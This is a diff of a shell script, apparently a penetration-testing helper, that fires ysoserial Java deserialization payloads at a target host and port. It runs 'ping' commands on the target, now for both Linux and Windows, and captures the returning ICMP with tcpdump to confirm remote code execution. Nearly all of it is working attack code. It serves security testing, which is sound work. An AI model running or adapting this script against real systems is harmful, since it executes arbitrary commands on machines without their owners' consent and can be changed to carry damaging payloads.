@@ -31,14 +31,40 @@ print_info "WARNING: This attack box must be reachable from the target !"
 echo
 print_info "Checking Ysoserial ${PAYLOAD} payload..."
 print_info "Will try to ping local IP = ${LOCALIP} from target"
+
 print_info "Running tcpdump in background to try to capture ICMP requests if service is vuln..."
 sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &"
-print_info "Running ysoserial command"
+
+print_info "Running ysoserial command for target Linux"
 print_info "java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} \"/bin/ping -c 4 ${LOCALIP}\""
 java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} "/bin/ping -c 4 ${LOCALIP}"
+
 print_info "Wait a little bit..."
-sleep 4
+sleep 3
 PID=$(ps -e | pgrep tcpdump)
+print_info "Kill tcpdump (PID=${PID})"
+sudo kill -9 $PID 
+sleep 2
+
+print_info "Captured ICMP traffic:"
+echo
+sudo tcpdump -r /tmp/dump.pcap
+echo
+
+print_info "Delete capture"
+sudo rm /tmp/dump.pcap
+
+print_info "Restart tcpdump..."
+sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &"
+
+print_info "Running ysoserial command for target Windows"
+print_info "java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} \"ping ${LOCALIP}\""
+java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} "ping ${LOCALIP}"
+
+print_info "Wait a little bit..."
+sleep 3
+PID=$(ps -e | pgrep tcpdump)
+
 print_info "Kill tcpdump (PID=${PID})"
 sudo kill -9 $PID 
 sleep 2
